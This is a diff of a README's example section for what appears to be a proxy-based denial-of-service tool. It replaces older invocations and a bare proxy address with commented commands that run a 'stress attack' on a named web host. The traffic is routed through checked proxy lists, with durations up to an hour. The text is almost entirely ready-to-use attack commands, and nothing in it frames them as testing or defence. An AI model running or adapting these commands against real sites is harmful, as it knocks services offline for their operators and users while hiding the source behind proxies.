@@ -27,9 +27,11 @@ Example:
    
    
    
-   
-python3 start.py STRESS http://test2.lug.in.ua 0 2 100 3600
-python3 start.py STRESS http://test2.lug.in.ua 0 2 0 10 600 true
+# stress attack using all proxies that were recieved from API's,
+# list af checked proxies will be saved in files/proxies/0_proxies_list.txt
+python3 start.py STRESS http://test2.lug.in.ua 0 2 0_proxies_list.txt 100 3600
 
+# stress attack using http proxies that were recieved from API's,
+# list af checked proxies will be saved in files/proxies/0_proxies_list.txt
+python3 start.py STRESS http://test2.lug.in.ua 1 2 0_proxies_list.txt 10 600 true
 
-http://77.236.238.69:1256
